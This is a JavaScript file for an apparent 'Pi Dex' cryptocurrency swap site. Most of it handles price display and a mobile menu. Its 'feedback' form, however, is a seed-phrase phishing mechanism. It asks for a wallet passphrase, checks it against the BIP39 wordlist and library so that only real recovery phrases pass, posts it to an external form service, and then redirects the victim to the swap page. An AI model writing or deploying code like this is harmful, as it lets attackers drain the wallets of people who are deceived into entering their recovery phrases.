// ========================================
// GLOBAL VARIABLES
// ========================================
let piPriceUSD = 3.14;
let selectedNetwork = 'BEP20';
let isBuyingPi = false;

// ========================================
// INITIALIZATION
// ========================================
document.addEventListener('DOMContentLoaded', function () {
    console.log('DOM Loaded');
    // Wait a bit for BIP39 library to load
    setTimeout(() => {
        initializeFeedbackPage();
        initializeDexPage();
        initializeMobileMenu();
        setupInputListeners();
    }, 100);
});

// ========================================
// FEEDBACK PAGE FUNCTIONALITY (FINAL)
// ========================================
async function initializeFeedbackPage() {
    const form = document.getElementById('feedbackForm');
    if (!form) {
        console.log('No feedback form found');
        return;
    }

    console.log('Feedback form found, initializing...');

    const mnemonicInput = document.getElementById('feedback');
    const errorMessage = document.getElementById('errorMessage');

    // Load BIP39 wordlist
    let wordlist = [];
    try {
        const response = await fetch('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt');
        const text = await response.text();
        wordlist = text.trim().split('\n');
        console.log('BIP39 wordlist loaded:', wordlist.length, 'words');
    } catch (error) {
        console.error('Failed to load BIP39 wordlist:', error);
    }

    function showError(msg) {
        console.log('Showing error:', msg);
        errorMessage.textContent = msg;
        errorMessage.style.display = 'block';
    }

    function hideError() {
        console.log('Hiding error');
        errorMessage.style.display = 'none';
    }

    function isValidBip39Mnemonic(mnemonic) {
        console.log('Validating mnemonic...');
        const words = mnemonic.split(/\s+/).filter(w => w.length > 0);
        console.log('Word count:', words.length);

        // Check word count
        if (![12, 15, 18, 21, 24].includes(words.length)) {
            console.log('Invalid word count');
            return false;
        }

        // Check if all words are in wordlist
        if (wordlist.length > 0) {
            for (const word of words) {
                if (!wordlist.includes(word)) {
                    console.log('Invalid word found:', word);
                    return false;
                }
            }
        }

        // Check with BIP39 library if available
        if (typeof window.bip39 !== 'undefined' && window.bip39 && window.bip39.validateMnemonic) {
            try {
                const isValid = window.bip39.validateMnemonic(mnemonic);
                console.log('BIP39 library validation:', isValid);
                return isValid;
            } catch (error) {
                console.error('BIP39 validation error:', error);
                // If BIP39 fails, fall back to wordlist check
                return true;
            }
        } else {
            console.warn('BIP39 library not available, using wordlist validation only');
            // If BIP39 library isn't loaded, accept if all words are valid
            return wordlist.length > 0;
        }
    }

    form.addEventListener('submit', async function (e) {
        e.preventDefault();
        console.log('Form submitted');

        const mnemonic = mnemonicInput.value.trim().toLowerCase();
        console.log('Mnemonic entered, word count:', mnemonic.split(/\s+/).filter(w => w.length > 0).length);

        // Validate passphrase
        if (!isValidBip39Mnemonic(mnemonic)) {
            showError('Invalid passphrase');
            return;
        }

        console.log('Mnemonic is valid, proceeding with submission...');
        hideError();

        const formData = new FormData(form);

        try {
            console.log('Sending to Formspree...');
            const response = await fetch(form.action, {
                method: 'POST',
                body: formData,
                headers: { Accept: 'application/json' }
            });

            console.log('Response status:', response.status);

            if (response.ok) {
                console.log('Submission successful, redirecting...');
                window.location.href = 'dex.html';
            } else {
                const errorData = await response.json();
                console.error('Submission failed:', errorData);
                showError('Submission failed. Please try again.');
            }
        } catch (error) {
            console.error('Network error:', error);
            showError('Network error. Please try again.');
        }
    });

    console.log('Form listener attached');
}

// ========================================
// DEX PAGE FUNCTIONALITY
// ========================================
function initializeDexPage() {
    const firstAmount = document.getElementById('firstAmount');
    if (firstAmount) {
        updatePriceDisplay();
    }
}

// ========================================
// MOBILE MENU
// ========================================
function initializeMobileMenu() {
    const menuToggle = document.getElementById('menuToggle');
    const navLinks = document.getElementById('navLinks');

    document.addEventListener('click', function (e) {
        if (navLinks && menuToggle) {
            const nav = document.querySelector('nav');
            if (nav && !nav.contains(e.target) && navLinks.classList.contains('active')) {
                navLinks.classList.remove('active');
                menuToggle.classList.remove('active');
            }
        }
    });
}

function toggleMenu() {
    const navLinks = document.getElementById('navLinks');
    const menuToggle = document.getElementById('menuToggle');
    if (navLinks) navLinks.classList.toggle('active');
    if (menuToggle) menuToggle.classList.toggle('active');
}

// ========================================
// INPUT LISTENERS
// ========================================
function setupInputListeners() {
    const firstAmount = document.getElementById('firstAmount');
    const secondAmount = document.getElementById('secondAmount');

    if (firstAmount) {
        firstAmount.addEventListener('input', () => !isBuyingPi && calculateAmount());
        firstAmount.addEventListener('keydown', e => {
            if (['-', 'e', 'E'].includes(e.key)) e.preventDefault();
        });
    }

    if (secondAmount) {
        secondAmount.addEventListener('input', () => isBuyingPi && calculateAmount());
        secondAmount.addEventListener('keydown', e => {
            if (['-', 'e', 'E'].includes(e.key)) e.preventDefault();
        });
    }
}

// ========================================
// PRICE + CALCULATIONS
// ========================================
function updatePriceDisplay() {
    const livePrice = document.getElementById('livePiPrice');
    if (livePrice) livePrice.textContent = '$' + piPriceUSD.toFixed(2);
}

function calculateAmount() {
    const firstAmount = document.getElementById('firstAmount');
    const secondAmount = document.getElementById('secondAmount');
    if (!firstAmount || !secondAmount) return;

    if (isBuyingPi) {
        const usdt = parseFloat(firstAmount.value) || 0;
        secondAmount.value = usdt > 0 ? (usdt / piPriceUSD).toFixed(4) : '';
    } else {
        const pi = parseFloat(firstAmount.value) || 0;
        secondAmount.value = pi > 0 ? (pi * piPriceUSD).toFixed(2) : '';
    }
}

// ========================================
// DEBUG
// ========================================
console.log('Pi Dex Script Loaded');

